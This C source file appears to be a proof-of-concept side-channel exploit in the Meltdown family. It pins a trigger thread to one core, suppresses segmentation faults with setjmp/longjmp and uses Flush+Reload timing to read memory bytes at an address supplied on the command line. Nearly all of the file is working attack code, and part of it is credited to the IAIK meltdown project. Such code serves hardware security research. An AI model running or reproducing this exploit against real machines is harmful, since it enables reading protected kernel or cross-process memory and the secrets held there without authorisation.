#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include "flush_reload.h"
#include "helper.h"

#define ITER 1000
#define EXECUTER_CORE   0
#define TRIGGER_CORE    1

extern void mo_leak(unsigned char *reload_buf, char *leak_ptr);
extern void mo_leak_trigger(void);

void *mo_trigger_loop(void *arg)
{
    while(1)
    {
        mo_leak_trigger();
    }
}

/* Code taken from https://github.com/IAIK/meltdown/blob/master/libkdump/libkdump.c */
static jmp_buf buf;
static int sigsegvs = 0;

static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

static void segfault_handler(int signum) {
    (void)signum;
    unblock_signal(SIGSEGV);
    sigsegvs++;
    longjmp(buf, 1);
}
/************************************************************************************/

int main(int argc, char **argv)
{
    uint64_t leak_addr;
    uint32_t leak_length;
    uint8_t *leak_ptr;
    pthread_t tid;

    if (argc > 2)
    {
        sscanf(argv[1], "0x%lx", &leak_addr);
        sscanf(argv[2], "%d", &leak_length);
        leak_ptr = (uint8_t *) leak_addr;
    }
    else
    {
        leak_ptr = "This is a test to verify that it leaks";
        leak_length = strlen(leak_ptr);
    }

    /* Setup */
    assert(signal(SIGSEGV, segfault_handler) != SIG_ERR);
    __attribute__((aligned(4096))) size_t results[LEAK_SIZE] = {0};
    unsigned char *reload_buf   = (unsigned char *) mmap(NULL, LEAK_SIZE*STRIDE, PROT_READ | PROT_WRITE,
            MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    assert(reload_buf != MAP_FAILED);
    set_cpu(EXECUTER_CORE);
    tid = create_thread(TRIGGER_CORE, mo_trigger_loop, NULL);
    usleep(2000);

    for(int i=0; i<leak_length; i++)
    {
        memset(results, 0, sizeof(results));

        for(int j=0; j<ITER; j++)
        {
            flush(reload_buf);
            if (!setjmp(buf))
            {
                mo_leak(reload_buf, leak_ptr+i);
            }
            reload(reload_buf, results);
        }

        printf("0x%016lx :\n", (uint64_t)(leak_ptr+i));
        print_results(results, ITER/10);
    }

    cancel_thread(tid);

    printf("Number of suppressed SIGSEGV: %d\n", sigsegvs);

    return 0;    
}

